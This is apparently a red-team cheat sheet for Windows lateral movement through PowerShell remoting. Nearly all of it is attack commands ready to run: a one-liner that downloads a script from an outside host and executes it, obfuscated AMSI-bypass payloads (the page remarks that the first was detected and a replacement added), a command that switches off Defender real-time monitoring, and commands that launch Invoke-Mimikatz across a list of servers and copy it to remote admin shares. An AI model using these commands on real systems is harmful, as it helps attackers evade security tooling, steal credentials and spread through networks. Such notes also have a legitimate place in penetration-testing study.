---
layout: editorial
---

# Thinking

**Connect to machine with administrator privs**

```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

**Execute commands on a machine**

```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

**Load script on a machine**

```
Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```

**Download and load script on a machine**

```
iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
```

**AMSI Bypass**

* First one gets detected, added a new one!

{% code overflow="wrap" %}
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
{% endcode %}

{% code overflow="wrap" %}
```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
```
{% endcode %}

**Disable AV monitoring**

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Execute locally loaded function on a list of remote machines**

{% code overflow="wrap" %}
```
Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content <list_of_servers>)
```
{% endcode %}

{% code overflow="wrap" %}
```
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
```
{% endcode %}

**Check the language mode**

```
$ExecutionContext.SessionState.LanguageMode
```

**Enumerate applocker policy**

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**Copy script to other server**

ps you can edit the script and call the method you wish so it executes, since you still cant load it in

```
Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
```
